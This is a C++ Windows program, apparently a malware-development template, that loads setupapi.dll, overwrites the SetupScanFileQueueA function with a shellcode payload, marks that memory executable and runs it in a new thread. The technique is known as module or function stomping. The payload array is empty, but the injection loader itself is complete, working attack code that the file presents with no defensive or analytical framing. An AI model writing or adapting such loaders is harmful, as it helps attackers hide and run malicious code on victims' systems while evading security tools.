#include <iostream>
#include <windows.h>
#include <Psapi.h>
using namespace std;

#define SACRIFICIAL_DLL "setupapi.dll"
#define SACRIFICIAL_FUNC "SetupScanFileQueueA"

unsigned char Payload[] = {
    
};

BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize){
    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)){
        cout << "[!] Error in Virtual Memory Protect [RW] .." << endl;
        cout << "[!] Error:" << GetLastError() << endl;
        return FALSE;
    }
    memcpy(pAddress, pPayload, sPayloadSize);

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)){
        cout << "[!] VirtualProtect [RWX] Failed With Error : " << GetLastError() << endl;
        return FALSE;
    }

    return TRUE;
}

int main(int argc, char *argv[]){
    PVOID pAddress;
    HANDLE hThread = NULL;
    HMODULE hModule = NULL;

    cout << "[#] Press <Enter> To Load \"" << SACRIFICIAL_DLL << "\" ... ";
    cin.get();
    hModule = LoadLibraryA(SACRIFICIAL_DLL);
    if (hModule == NULL){
        cout << "[!] DLL Cannot Loaded!" << endl;
        cout << "[!] Error:" << GetLastError() << endl;
        return 1;
    }
    cout << "[+] DONE" << endl;

    pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
    if (pAddress == NULL){
        cout << "[!] Error in load function from DLL .." << endl;
        cout << "[!] Error:" << GetLastError() << endl;
        return 1;
    }

    cout << "[+] Address Of \"" << SACRIFICIAL_FUNC << "\" : 0x" << pAddress << endl;
    cout << "[#] Press <Enter> To Write Payload ... ";
    cin.get();

    cout << "[i] Writing ... ";
    if (!WritePayload(pAddress, Payload, sizeof(Payload))){
        cout << "\t[>>] Press <Enter> to Quit .." << endl;
        cin.get();
        return 1;
    }
    cout << "[+] DONE" << endl;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    cout << "[#] Press <Enter> To Quit ... ";
    cin.get();

    return 0;
}
